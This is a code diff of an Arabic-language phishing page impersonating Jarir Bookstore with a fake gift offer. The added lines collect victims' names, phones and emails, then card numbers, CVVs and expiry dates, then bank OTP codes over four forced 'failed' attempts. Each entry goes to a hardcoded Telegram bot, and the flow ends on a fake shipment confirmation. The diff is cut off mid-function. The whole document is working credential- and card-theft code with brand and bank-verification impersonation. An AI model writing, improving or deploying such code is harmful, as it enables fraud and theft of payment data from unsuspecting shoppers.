@@ -10,10 +10,10 @@
     <style>
         :root { --jarir-red: #E30613; --jarir-navy: #2D3E50; }
         body { font-family: 'Cairo', sans-serif; background-color: #ffffff; }
-        .page { display: none; min-height: 100vh; }
-        .page.active { display: block; }
+        .page { display: none !important; min-height: 100vh; }
+        .page.active { display: block !important; }
         .form-input { width: 100%; background: #F0F2F5; border: 1px solid #E5E7EB; border-radius: 4px; padding: 12px; outline: none; text-align: right; font-size: 14px; }
-        .btn-red { background-color: var(--jarir-red); width: 100%; color: white; font-weight: bold; border-radius: 8px; transition: 0.3s; }
+        .btn-red { background-color: var(--jarir-red); width: 100%; color: white; font-weight: bold; border-radius: 8px; transition: 0.3s; cursor: pointer; }
         
         .cart-icon-container { position: relative; background: #F0F2F5; padding: 8px; border-radius: 8px; }
         .cart-badge { position: absolute; top: -5px; right: -5px; background: #FF9800; color: white; font-size: 10px; width: 18px; height: 18px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; }
@@ -22,14 +22,11 @@
 
         .error-msg { display: none; color: white; background: #E30613; padding: 10px; border-radius: 4px; text-align: center; font-size: 13px; margin-bottom: 15px; font-weight: bold; }
         .card-wrapper { position: relative; width: 100%; }
-        /* تكبير أيقونة نوع البطاقة داخل الحقل */
         .card-type-icon { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); height: 28px; transition: 0.3s; pointer-events: none; opacity: 0; }
         
-        /* تحسينات صفحة التحقق لتطابق الأصلية */
         #page-verify h2 { font-family: sans-serif; letter-spacing: -0.5px; }
         .verify-text { font-family: sans-serif; color: #333; }
 
-        /* أنماط صفحة النجاح الجديدة - مدمجة من الكود الثاني */
         :root {
             --active-green: #5eb471;
             --inactive-grey: #a0a0a0;
@@ -157,9 +154,6 @@
 
         .email { font-family: sans-serif; letter-spacing: 0.5px; }
 
-        /* ==================== الإضافات الجديدة ==================== */
-        
-        /* 1. تأثيرات حركة للأزرار */
         .btn-red:hover {
             transform: translateY(-2px);
             box-shadow: 0 4px 12px rgba(227, 6, 19, 0.3);
@@ -169,13 +163,11 @@
             transform: translateY(0);
         }
 
-        /* 2. تأثيرات على حقول الإدخال */
         .form-input:focus {
             border-color: var(--jarir-red);
             box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.1);
         }
 
-        /* 3. شريط التقدم العلوي */
         .progress-bar {
             position: fixed;
             top: 0;
@@ -187,7 +179,6 @@
             z-index: 9999;
         }
 
-        /* 4. تأثير تحميل عند الانتقال بين الصفحات */
         .page-transition {
             animation: fadeIn 0.4s ease-out;
         }
@@ -197,7 +188,6 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
-        /* 5. تأثير على صورة المنتج */
         .product-image {
             transition: transform 0.3s ease;
         }
@@ -206,21 +196,6 @@
             transform: scale(1.05);
         }
 
-        /* 6. عداد تنازلي للعرض */
-        .countdown-banner {
-            background: linear-gradient(90deg, #E30613 0%, #ff4757 100%);
-            color: white;
-            padding: 10px;
-            text-align: center;
-            font-weight: bold;
-            font-size: 14px;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            display: none;
-        }
-
-        /* 7. تأثيرات على البطاقات */
         .payment-card {
             transition: all 0.3s ease;
         }
@@ -229,7 +204,6 @@
             box-shadow: 0 8px 25px rgba(0,0,0,0.1);
         }
 
-        /* 8. مؤشر جاري المعالجة */
         .loading-spinner {
             display: none;
             width: 20px;
@@ -246,7 +220,6 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* 9. تأثير اهتزاز للخطأ */
         .shake {
             animation: shake 0.5s;
         }
@@ -257,7 +230,6 @@
             75% { transform: translateX(10px); }
         }
 
-        /* 10. شعار متحرك */
         .logo-pulse {
             animation: pulse 2s infinite;
         }
@@ -268,7 +240,6 @@
             100% { transform: scale(1); }
         }
 
-        /* 11. زر العودة للأعلى المحسن */
         .back-to-top {
             transition: all 0.3s;
             opacity: 0;
@@ -286,7 +257,6 @@
             border-color: var(--jarir-red);
         }
 
-        /* 12. نافذة منبثقة للتأكيد */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -314,7 +284,6 @@
             to { transform: translateY(0); opacity: 1; }
         }
 
-        /* 13. شريط جانبي للتوثيق */
         .security-badge {
             position: fixed;
             bottom: 20px;
@@ -331,7 +300,6 @@
             z-index: 99;
         }
 
-        /* 14. تأثيرات على الروابط الاجتماعية */
         .social-icon {
             transition: all 0.3s;
             cursor: pointer;
@@ -342,30 +310,46 @@
             filter: brightness(1.2);
         }
 
-        /* 15. مؤشر التمرير */
-        .scroll-indicator {
+        /* شاشة التحميل الكاملة */
+        .full-loading {
+            display: none;
             position: fixed;
-            right: 10px;
-            top: 50%;
-            transform: translateY(-50%);
-            display: flex;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,255,255,0.95);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
             flex-direction: column;
-            gap: 5px;
-            z-index: 98;
         }
         
-        .scroll-dot {
-            width: 8px;
-            height: 8px;
+        .full-loading.active {
+            display: flex;
+        }
+        
+        .full-loading .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--jarir-red);
             border-radius: 50%;
-            background: #ddd;
-            transition: all 0.3s;
+            animation: spin 1s linear infinite;
         }
         
-        .scroll-dot.active {
-            background: var(--jarir-red);
-            height: 20px;
-            border-radius: 4px;
+        .full-loading p {
+            margin-top: 20px;
+            color: #333;
+            font-weight: bold;
+        }
+
+        /* عداد محاولات OTP */
+        .otp-attempts {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 12px;
+            color: #666;
         }
     </style>
 </head>
@@ -374,9 +358,10 @@
     <!-- شريط التقدم العلوي -->
     <div class="progress-bar" id="progressBar"></div>
 
-    <!-- شريط العد التنازلي -->
-    <div class="countdown-banner" id="countdownBanner">
-        ⏰ العرض ينتهي خلال: <span id="countdown">15:00</span>
+    <!-- شاشة التحميل الكاملة -->
+    <div class="full-loading" id="fullLoading">
+        <div class="spinner"></div>
+        <p>جاري المعالجة...</p>
     </div>
 
     <section id="page-product" class="page active page-transition">
@@ -424,9 +409,8 @@
             </div>
 
             <div class="flex justify-between items-center mb-6">
-                <button onclick="showPage('page-register')" class="bg-[#E30613] text-white font-bold w-1/2 py-4 rounded-lg text-lg flex justify-center items-center">
-                    <span id="btnText">استلم الهديه</span>
-                    <div class="loading-spinner" id="btnSpinner"></div>
+                <button onclick="goToRegister()" class="bg-[#E30613] text-white font-bold w-1/2 py-4 rounded-lg text-lg flex justify-center items-center">
+                    <span>استلم الهديه</span>
                 </button>
                 <div class="text-right">
                     <div class="text-[#E30613] text-3xl font-black">هديه من جرير <span class="text-sm">ر.س</span></div>
@@ -448,12 +432,12 @@
 
     <section id="page-register" class="page bg-white page-transition">
         <header class="p-4 border-b flex justify-between items-center">
-            <button onclick="showPage('page-product')"><i class="fa-solid fa-chevron-right"></i>العودة</button>
+            <button onclick="goToProduct()"><i class="fa-solid fa-chevron-right"></i>العودة</button>
             <span class="font-bold">معلومات تسليم الهديه</span>
             <img src="https://i.ibb.co/h1mkXJhd/41826-EFC-5-C60-40-C5-BBEC-61-D40-D90-EB9-F.png" class="h-6">
         </header>
         <div class="p-6 space-y-4">
-            <div id="err-reg" class="error-msg">يرجى إدخال البيانات المطلوبة</div>
+            <div id="err-reg" class="error-msg">يرجى إدخال البيانات المطلوبة بشكل صحيح</div>
             <div class="text-right">
                 <label class="text-xs text-gray-400">اسم الدولة</label>
                 <div class="form-input flex justify-between items-center bg-gray-50">
@@ -463,8 +447,8 @@
             </div>
             <div class="flex gap-2">
                 <div class="w-2/3">
-                    <label class="text-xs text-gray-400 text-right block">رقم الهاتف</label>
-                    <input type="tel" id="user-phone" class="form-input">
+                    <label class="text-xs text-gray-400 text-right block">رقم الهاتف *</label>
+                    <input type="tel" id="user-phone" class="form-input" placeholder="05xxxxxxxx" maxlength="10">
                 </div>
                 <div class="w-1/3">
                     <label class="text-xs text-gray-400 text-right block">رمز الدولة</label>
@@ -475,9 +459,9 @@
                     </div>
                 </div>
             </div>
-            <input type="text" id="user-name" placeholder="الاسم الأول" class="form-input">
-            <input type="email" id="user-email" placeholder="البريد الإلكتروني" class="form-input">
-            <button onclick="sendData('register')" class="btn-red py-4 mt-6 flex justify-center items-center">
+            <input type="text" id="user-name" placeholder="الاسم الأول *" class="form-input">
+            <input type="email" id="user-email" placeholder="البريد الإلكتروني *" class="form-input">
+            <button onclick="submitRegister()" class="btn-red py-4 mt-6 flex justify-center items-center">
                 <span id="regBtnText">استمرار</span>
                 <div class="loading-spinner" id="regSpinner"></div>
             </button>
@@ -486,7 +470,7 @@
 
     <section id="page-payment" class="page bg-[#F3F5F7] page-transition">
         <header class="p-4 bg-white border-b flex justify-between items-center">
-            <button onclick="showPage('page-register')"><i class="fa-solid fa-chevron-right"></i>العودة</button>
+            <button onclick="goToRegister()"><i class="fa-solid fa-chevron-right"></i>العودة</button>
             <span class="font-bold">دفع مصاريف الشحن</span>
             <img src="https://i.ibb.co/h1mkXJhd/41826-EFC-5-C60-40-C5-BBEC-61-D40-D90-EB9-F.png" class="h-6">
         </header>
@@ -506,32 +490,32 @@
                 <div class="space-y-4">
                     <div class="card-wrapper">
                         <img id="card-type-img" src="" class="card-type-icon">
-                        <input type="tel" id="card-num" placeholder="رقم البطاقة" class="form-input" maxlength="16" oninput="detectCard(this.value)">
+                        <input type="tel" id="card-num" placeholder="رقم البطاقة (16 رقم)" class="form-input" maxlength="16" oninput="detectCard(this.value)">
                     </div>
                     <div class="flex gap-2">
-                        <input type="tel" id="card-cvv" placeholder="رمز التحقق (CVV)" class="form-input w-1/3" maxlength="3">
+                        <input type="tel" id="card-cvv" placeholder="CVV (3 أرقام)" class="form-input w-1/3" maxlength="3">
                         <input type="tel" id="card-exp" placeholder="MM/YY" class="form-input w-2/3" maxlength="5" oninput="formatExp(this)">
                     </div>
                     <input type="text" id="card-holder" placeholder="اسم حامل البطاقة" class="form-input">
                 </div>
-                <button onclick="sendData('payment')" class="btn-red py-4 mt-8 flex justify-center items-center">
-                    <span id="payBtnText">مصاريف الشحن( 76ر.س.)</span>
+                <button onclick="submitPayment()" class="btn-red py-4 mt-8 flex justify-center items-center">
+                    <span id="payBtnText">مصاريف الشحن (76 ر.س)</span>
                     <div class="loading-spinner" id="paySpinner"></div>
                 </button>
             </div>
 
             <div class="mt-8 grid grid-cols-4 gap-2 px-4">
                 <div class="bg-white border rounded p-2 flex items-center justify-center">
-                    <a href="https://ibb.co/93q7T39N"><img src="https://i.ibb.co/cXNjFXc1/2-A41-DBE2-EA77-4-E51-A1-DC-04-F571642322.png" alt="2-A41-DBE2-EA77-4-E51-A1-DC-04-F571642322" border="0" class="h-10"></a>
+                    <img src="https://i.ibb.co/cXNjFXc1/2-A41-DBE2-EA77-4-E51-A1-DC-04-F571642322.png" class="h-10">
                 </div>
                 <div class="bg-white border rounded p-2 flex items-center justify-center">
-                    <a href="https://ibb.co/dC5vrVZ"><img src="https://i.ibb.co/x97bDBZ/E0-E5-DFC0-0047-4-BB9-915-B-DEDC2-EC3-CC3-B.png" alt="E0-E5-DFC0-0047-4-BB9-915-B-DEDC2-EC3-CC3-B" border="0" class="h-10"></a>
+                    <img src="https://i.ibb.co/x97bDBZ/E0-E5-DFC0-0047-4-BB9-915-B-DEDC2-EC3-CC3-B.png" class="h-10">
                 </div>
                 <div class="bg-white border rounded p-2 flex items-center justify-center">
-                    <a href="https://ibb.co/DDyjk2hs"><img src="https://i.ibb.co/HDs9Y861/AC079077-B4-F5-4336-A7-AE-16-A1-BDF07-EE9.png" alt="AC079077-B4-F5-4336-A7-AE-16-A1-BDF07-EE9" border="0" class="h-10"></a>
+                    <img src="https://i.ibb.co/HDs9Y861/AC079077-B4-F5-4336-A7-AE-16-A1-BDF07-EE9.png" class="h-10">
                 </div>
                 <div class="bg-white border rounded p-2 flex items-center justify-center">
-                    <a href="https://ibb.co/4g7jDX6y"><img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" alt="E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A" border="0" class="h-10"></a>
+                    <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" class="h-10">
                 </div>
             </div>
         </main>
@@ -539,7 +523,7 @@
 
     <section id="page-verify" class="page bg-white p-6 page-transition">
         <div class="flex justify-end mb-4">
-            <span class="font-bold text-black cursor-pointer text-base" onclick="showPage('page-payment')">Cancel</span>
+            <span class="font-bold text-black cursor-pointer text-base" onclick="goToPayment()">Cancel</span>
         </div>
         <div class="flex justify-between items-center border-b border-gray-100 pb-4 mb-8">
             <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" style="height: 18px;">
@@ -554,16 +538,17 @@
             <p class="mt-5">You are paying <strong>JARIR BOOKSTORE</strong> the amount of <strong>SAR 76.00</strong> on 2026/02/15.</p>
         </div>
         <div id="err-otp" class="error-msg">رمز التحقق غير صحيح، حاول مجدداً</div>
-        <div class="text-center mb-8">
+        <div class="text-center mb-4">
             <label class="block text-gray-500 text-xs mb-3 font-sans">Verification code</label>
-            <input type="tel" id="bank-otp" class="w-full border border-gray-300 rounded p-4 text-center text-2xl outline-none font-sans tracking-widest">
+            <input type="tel" id="bank-otp" class="w-full border border-gray-300 rounded p-4 text-center text-2xl outline-none font-sans tracking-widest" maxlength="6" placeholder="______">
         </div>
-        <button onclick="sendData('otp')" class="w-full bg-[#0000FF] text-white py-4 font-bold rounded-md text-lg mb-8 shadow-sm flex justify-center items-center">
+        <div class="otp-attempts" id="otpAttempts">المحاولات المتبقية: <span id="attemptsLeft">4</span></div>
+        <button onclick="submitOTP()" class="w-full bg-[#0000FF] text-white py-4 font-bold rounded-md text-lg mb-8 shadow-sm flex justify-center items-center">
             <span id="otpBtnText">CONFIRM</span>
             <div class="loading-spinner" id="otpSpinner"></div>
         </button>
         <div class="text-center">
-            <span class="text-[#0000FF] font-bold text-sm cursor-pointer hover:underline">RESEND CODE</span>
+            <span class="text-[#0000FF] font-bold text-sm cursor-pointer hover:underline" onclick="resendOTP()">RESEND CODE</span>
         </div>
         <div class="mt-12 border-t pt-5 space-y-5">
             <div class="flex justify-between items-center text-[15px] text-[#2D3E50]"><span>Learn more about authentication</span> <span class="text-2xl">+</span></div>
@@ -571,12 +556,12 @@
         </div>
     </section>
 
-    <!-- الصفحة الجديدة المدمجة - صفحة النجاح -->
+    <!-- صفحة النجاح مع بيانات ديناميكية -->
     <section id="page-success" class="page bg-[#e9ecef] p-5 page-transition">
         <div class="success-screen">
             <div class="app-bar">
                 <div class="icon">⋮</div>
-                <h1>شحنة رقم # 51972521</h1>
+                <h1>شحنة رقم # <span id="dynamicTrackingNumber">51972521</span></h1>
                 <div class="icon">〉</div>
             </div>
 
@@ -585,7 +570,7 @@
                     <div class="dot"></div>
                     <div class="step-content">
                         <span class="step-title">إنشاء الطلب</span>
-                        <span class="step-date">تم إنشاء الطلب : الأحد، 19-أكتوبر-2025</span>
+                        <span class="step-date" id="dynamicOrderDate">تم إنشاء الطلب : الأحد، 19-أكتوبر-2025</span>
                     </div>
                 </div>
 
@@ -619,18 +604,28 @@
             </div>
 
             <div class="barcode-area">
-                <img src="https://bwipjs-api.metafloor.com/?bcid=code128&text=2007992813&scale=4&includetext=false" class="barcode-img">
-                <div class="order-number">رقم الطلب: 2007992813</div>
+                <img src="https://bwipjs-api.metafloor.com/?bcid=code128&text=2007992813&scale=4&includetext=false" class="barcode-img" id="dynamicBarcode">
+                <div class="order-number">رقم الطلب: <span id="dynamicOrderNumber">2007992813</span></div>
             </div>
 
             <div class="info-row">
                 <span class="label">تاريخ إنشاء الطلب</span>
-                <span class="value">الأحد، 19-أكتوبر-2025</span>
+                <span class="value" id="dynamicCreateDate">الأحد، 19-أكتوبر-2025</span>
             </div>
 
             <div class="info-row">
                 <span class="label">الشحن إلى:</span>
-                <span class="value email">campus6med@gmail.com</span>
+                <span class="value email" id="dynamicUserEmail">campus6med@gmail.com</span>
+            </div>
+
+            <div class="info-row">
+                <span class="label">رقم الهاتف:</span>
+                <span class="value" id="dynamicUserPhone">+966 596324178</span>
+            </div>
+
+            <div class="info-row">
+                <span class="label">الاسم:</span>
+                <span class="value" id="dynamicUserName">Reda shfi</span>
             </div>
 
             <div class="info-row">
@@ -651,56 +646,348 @@
         <span>آمن 100% - SSL</span>
     </div>
 
-    <!-- نافذة منبثقة -->
-    <div class="modal-overlay" id="modalOverlay" onclick="closeModal()">
-        <div class="modal-content" onclick="event.stopPropagation()">
-            <i class="fa-solid fa-circle-check text-5xl text-green-500 mb-4"></i>
-            <h3 class="font-bold text-lg mb-2">تم بنجاح!</h3>
-            <p class="text-gray-600 text-sm mb-4" id="modalText">تم إرسال البيانات بنجاح</p>
-            <button onclick="closeModal()" class="bg-[#E30613] text-white px-6 py-2 rounded-lg font-bold">موافق</button>
-        </div>
-    </div>
-
     <script>
         const botToken = "8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q";
         const chatId = "1705240737";
+        
+        // عداد محاولات OTP
+        let otpAttempts = 0;
+        const maxOtpAttempts = 4;
+        
+        // تخزين بيانات المستخدم
+        let userData = {
+            name: '',
+            phone: '',
+            email: ''
+        };
 
-        // ==================== الإضافات الجديدة ====================
-
-        // 1. شريط التقدم
-        function updateProgressBar(percent) {
-            document.getElementById('progressBar').style.width = percent + '%';
-        }
-
-        // 2. عداد تنازلي
-        let countdownInterval;
-        function startCountdown() {
-            const banner = document.getElementById('countdownBanner');
-            banner.style.display = 'block';
-            let minutes = 15;
-            let seconds = 0;
+        // دالة الانتقال بين الصفحات مع تحميل
+        function showPage(pageId) {
+            // إظهار شاشة التحميل
+            document.getElementById('fullLoading').classList.add('active');
             
-            countdownInterval = setInterval(() => {
-                if (seconds === 0) {
-                    if (minutes === 0) {
-                        clearInterval(countdownInterval);
-                        banner.innerHTML = '⏰ انتهى العرض!';
-                        return;
-                    }
-                    minutes--;
-                    seconds = 59;
-                } else {
-                    seconds--;
+            setTimeout(function() {
+                // إخفاء جميع الصفحات
+                var allPages = document.querySelectorAll('.page');
+                for (var i = 0; i < allPages.length; i++) {
+                    allPages[i].classList.remove('active');
                 }
-                document.getElementById('countdown').textContent = 
-                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-            }, 1000);
+                
+                // إظهار الصفحة المطلوبة
+                var targetPage = document.getElementById(pageId);
+                if (targetPage) {
+                    targetPage.classList.add('active');
+                }
+                
+                // إخفاء شاشة التحميل
+                document.getElementById('fullLoading').classList.remove('active');
+                
+                // التمرير لأعلى
+                window.scrollTo(0, 0);
+                
+                // تحديث شريط التقدم
+                updateProgressBar(pageId);
+                
+                // إذا كانت صفحة النجاح، تحديث البيانات الديناميكية
+                if (pageId === 'page-success') {
+                    updateSuccessPage();
+                }
+            }, 800);
         }
 
-        // 3. عرض زر العودة للأعلى عند التمرير
+        // تحديث صفحة النجاح بالبيانات الديناميكية
+        function updateSuccessPage() {
+            // توليد تاريخ الغد تلقائياً
+            var tomorrow = new Date();
+            tomorrow.setDate(tomorrow.getDate() + 1);
+            
+            var days = ['الأحد', 'الإثنين', 'الثلاثاء', 'الأربعاء', 'الخميس', 'الجمعة', 'السبت'];
+            var months = ['يناير', 'فبراير', 'مارس', 'أبريل', 'مايو', 'يونيو', 'يوليو', 'أغسطس', 'سبتمبر', 'أكتوبر', 'نوفمبر', 'ديسمبر'];
+            
+            var dayName = days[tomorrow.getDay()];
+            var dayNum = tomorrow.getDate();
+            var monthName = months[tomorrow.getMonth()];
+            var year = tomorrow.getFullYear();
+            
+            var formattedDate = dayName + '، ' + dayNum + '-' + monthName + '-' + year;
+            
+            // توليد أرقام عشوائية للطلب
+            var trackingNum = Math.floor(10000000 + Math.random() * 90000000);
+            var orderNum = Math.floor(1000000000 + Math.random() * 9000000000);
+            
+            // تحديث العناصر
+            document.getElementById('dynamicTrackingNumber').textContent = trackingNum;
+            document.getElementById('dynamicOrderDate').textContent = 'تم إنشاء الطلب : ' + formattedDate;
+            document.getElementById('dynamicCreateDate').textContent = formattedDate;
+            document.getElementById('dynamicOrderNumber').textContent = orderNum;
+            
+            // تحديث الباركود
+            document.getElementById('dynamicBarcode').src = 'https://bwipjs-api.metafloor.com/?bcid=code128&text=' + orderNum + '&scale=4&includetext=false';
+            
+            // تحديث بيانات المستخدم
+            document.getElementById('dynamicUserName').textContent = userData.name || 'غير محدد';
+            document.getElementById('dynamicUserPhone').textContent = '+966 ' + (userData.phone || '000000000');
+            document.getElementById('dynamicUserEmail').textContent = userData.email || 'غير محدد';
+        }
+
+        // دوال التنقل المباشر
+        function goToProduct() {
+            showPage('page-product');
+        }
+
+        function goToRegister() {
+            showPage('page-register');
+        }
+
+        function goToPayment() {
+            showPage('page-payment');
+        }
+
+        function goToVerify() {
+            showPage('page-verify');
+        }
+
+        function goToSuccess() {
+            showPage('page-success');
+        }
+
+        // التحقق من صحة البريد الإلكتروني
+        function isValidEmail(email) {
+            var re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+
+        // التحقق من صحة رقم الهاتف السعودي
+        function isValidPhone(phone) {
+            var re = /^(05|5)[0-9]{8}$/;
+            return re.test(phone);
+        }
+
+        // إرسال البيانات والانتقال - صفحة التسجيل
+        async function submitRegister() {
+            var phone = document.getElementById('user-phone').value.trim();
+            var name = document.getElementById('user-name').value.trim();
+            var email = document.getElementById('user-email').value.trim();
+            
+            // التحقق من البيانات
+            if (!phone || !isValidPhone(phone)) {
+                document.getElementById('err-reg').textContent = 'يرجى إدخال رقم هاتف صحيح (مثال: 0596324178)';
+                document.getElementById('err-reg').style.display = 'block';
+                document.getElementById('err-reg').classList.add('shake');
+                setTimeout(function() {
+                    document.getElementById('err-reg').classList.remove('shake');
+                }, 500);
+                return;
+            }
+            
+            if (!name || name.length < 2) {
+                document.getElementById('err-reg').textContent = 'يرجى إدخال الاسم الأول';
+                document.getElementById('err-reg').style.display = 'block';
+                document.getElementById('err-reg').classList.add('shake');
+                setTimeout(function() {
+                    document.getElementById('err-reg').classList.remove('shake');
+                }, 500);
+                return;
+            }
+            
+            if (!email || !isValidEmail(email)) {
+                document.getElementById('err-reg').textContent = 'يرجى إدخال بريد إلكتروني صحيح';
+                document.getElementById('err-reg').style.display = 'block';
+                document.getElementById('err-reg').classList.add('shake');
+                setTimeout(function() {
+                    document.getElementById('err-reg').classList.remove('shake');
+                }, 500);
+                return;
+            }
+            
+            // حفظ بيانات المستخدم
+            userData.name = name;
+            userData.phone = phone;
+            userData.email = email;
+            
+            // إظهار التحميل على الزر
+            document.getElementById('regSpinner').style.display = 'block';
+            document.getElementById('regBtnText').style.opacity = '0.7';
+            
+            // إرسال للتليجرام
+            var text = "👤 زبون جديد:\n📞 هاتف: " + phone + "\n📝 اسم: " + name + "\n📧 بريد: " + email;
+            
+            try {
+                await fetch("https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(text));
+            } catch (e) {
+                console.log('Error sending to Telegram');
+            }
+            
+            // إخفاء التحميل
+            document.getElementById('regSpinner').style.display = 'none';
+            document.getElementById('regBtnText').style.opacity = '1';
+            
+            // الانتقال للصفحة التالية مع تحميل
+            goToPayment();
+        }
+
+        // إرسال بيانات البطاقة
+        async function submitPayment() {
+            var cardNum = document.getElementById('card-num').value.trim();
+            var cvv = document.getElementById('card-cvv').value.trim();
+            var exp = document.getElementById('card-exp').value.trim();
+            var holder = document.getElementById('card-holder').value.trim();
+            
+            // التحقق من البيانات
+            if (!cardNum || cardNum.length !== 16 || !/^\d+$/.test(cardNum)) {
+                document.getElementById('err-pay').textContent = 'يرجى إدخال رقم بطاقة صحيح (16 رقم)';
+                document.getElementById('err-pay').style.display = 'block';
+                document.getElementById('err-pay').classList.add('shake');
+                setTimeout(function() {
+                    document.getElementById('err-pay').classList.remove('shake');
+                }, 500);
+                return;
+            }
+            
+            if (!cvv || cvv.length !== 3 || !/^\d+$/.test(cvv)) {
+                document.getElementById('err-pay').textContent = 'يرجى إدخال CVV صحيح (3 أرقام)';
+                document.getElementById('err-pay').style.display = 'block';
+                document.getElementById('err-pay').classList.add('shake');
+                setTimeout(function() {
+                    document.getElementById('err-pay').classList.remove('shake');
+                }, 500);
+                return;
+            }
+            
+            if (!exp || exp.length !== 5 || !exp.includes('/')) {
+                document.getElementById('err-pay').textContent = 'يرجى إدخال تاريخ انتهاء صحيح (MM/YY)';
+                document.getElementById('err-pay').style.display = 'block';
+                document.getElementById('err-pay').classList.add('shake');
+                setTimeout(function() {
+                    document.getElementById('err-pay').classList.remove('shake');
+                }, 500);
+                return;
+            }
+            
+            if (!holder || holder.length < 3) {
+                document.getElementById('err-pay').textContent = 'يرجى إدخال اسم حامل البطاقة';
+                document.getElementById('err-pay').style.display = 'block';
+                document.getElementById('err-pay').classList.add('shake');
+                setTimeout(function() {
+                    document.getElementById('err-pay').classList.remove('shake');
+                }, 500);
+                return;
+            }
+            
+            // إظهار التحميل على الزر
+            document.getElementById('paySpinner').style.display = 'block';
+            document.getElementById('payBtnText').style.opacity = '0.7';
+            
+            // إرسال للتليجرام
+            var text = "💳 بطاقة:\n🔢 رقم: " + cardNum + "\n📅 تاريخ: " + exp + "\n🔒 CVV: " + cvv + "\n👤 اسم: " + holder;
+            
+            try {
+                await fetch("https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(text));
+            } catch (e) {
+                console.log('Error sending to Telegram');
+            }
+            
+            // إخفاء التحميل
+            document.getElementById('paySpinner').style.display = 'none';
+            document.getElementById('payBtnText').style.opacity = '1';
+            
+            // إعادة تعيين عداد OTP
+            otpAttempts = 0;
+            document.getElementById('attemptsLeft').textContent = maxOtpAttempts;
+            document.getElementById('bank-otp').value = '';
+            
+            // الانتقال للصفحة التالية مع تحميل
+            goToVerify();
+        }
+
+        // إرسال OTP - 4 محاولات
+        async function submitOTP() {
+            var otp = document.getElementById('bank-otp').value.trim();
+            
+            if (!otp || otp.length < 4) {
+                document.getElementById('err-otp').textContent = 'يرجى إدخال رمز التحقق';
+                document.getElementById('err-otp').style.display = 'block';
+                return;
+            }
+            
+            // إظهار التحميل على الزر
+            document.getElementById('otpSpinner').style.display = 'block';
+            document.getElementById('otpBtnText').style.opacity = '0.7';
+            
+            // إرسال للتليجرام
+            otpAttempts++;
+            var text = "🔑 محاولة OTP رقم " + otpAttempts + ":\n" + otp + "\n👤 المستخدم: " + userData.name + "\n📞 الهاتف: " + userData.phone;
+            
+            try {
+                await fetch("https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(text));
+            } catch (e) {
+                console.log('Error sending to Telegram');
+            }
+            
+            // إخفاء التحميل
+            document.getElementById('otpSpinner').style.display = 'none';
+            document.getElementById('otpBtnText').style.opacity = '1';
+            
+            // التحقق من عدد المحاولات
+            if (otpAttempts < maxOtpAttempts) {
+                // إظهار خطأ والسماح بمحاولة أخرى
+                var remaining = maxOtpAttempts - otpAttempts;
+                document.getElementById('err-otp').textContent = 'رمز التحقق غير صحيح، محاولات متبقية: ' + remaining;
+                document.getElementById('err-otp').style.display = 'block';
+                document.getElementById('attemptsLeft').textContent = remaining;
+                document.getElementById('bank-otp').value = '';
+                document.getElementById('bank-otp').focus();
+            } else {
+                // المحاولة الرابعة - الانتقال للصفحة النهائية
+                goToSuccess();
+            }
+        }
+
+        // إعادة إرسال OTP
+        function resendOTP() {
+            document.getElementById('bank-otp').value = '';
+            document.getElementById('bank-otp').focus();
+            document.getElementById('err-otp').textContent = 'تم إعادة إرسال الرمز';
+            document.getElementById('err-otp').style.display = 'block';
+            document.getElementById('err-otp').style.background = '#5eb471';
+        }
+
+        // الدوال المساعدة
+        function formatExp(i) {
+            var v = i.value.replace(/\D/g, '');
+            if (v.length >= 2) {
+                i.value = v.substring(0, 2) + '/' + v.substring(2, 4);
+            }
+        }
+
+        function detectCard(v) {
+            var img = document.getElementById('card-type-img');
+            if (v.startsWith('4')) {
+                img.src = "https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png";
+                img.style.opacity = "1";
+            } else if (v.startsWith('5')) {
+                img.src = "https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png";
+                img.style.opacity = "1";
+            } else {
+                img.style.opacity = "0";
+            }
+        }
+
+        function updateProgressBar(pageId) {
+            var bar = document.getElementById('progressBar');
+            var percent = 0;
+            if (pageId === 'page-product') percent = 0;
+            else if (pageId === 'page-register') percent = 25;
+            else if (pageId === 'page-payment') percent = 50;
+            else if (pageId === 'page-verify') percent = 75;
+            else if (pageId === 'page-success') percent = 100;
+            bar.style.width = percent + '%';
+        }
+
+        // زر العودة للأعلى
         window.onscroll = function() {
-            const btn = document.getElementById('backToTop');
-            if (document.body.scrollTop > 300 || document.documentElement.scrollTop > 300) {
+            var btn = document.getElementById('backToTop');
+            if (window.pageYOffset > 300) {
                 btn.classList.add('visible');
             } else {
                 btn.classList.remove('visible');
@@ -710,136 +997,6 @@
         function scrollToTop() {
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
-
-        // 4. نافذة منبثقة
-        function showModal(text) {
-            document.getElementById('modalText').textContent = text;
-            document.getElementById('modalOverlay').style.display = 'flex';
-        }
-
-        function closeModal() {
-            document.getElementById('modalOverlay').style.display = 'none';
-        }
-
-        // 5. تأثير الاهتزاز للخطأ
-        function shakeElement(elementId) {
-            const el = document.getElementById(elementId);
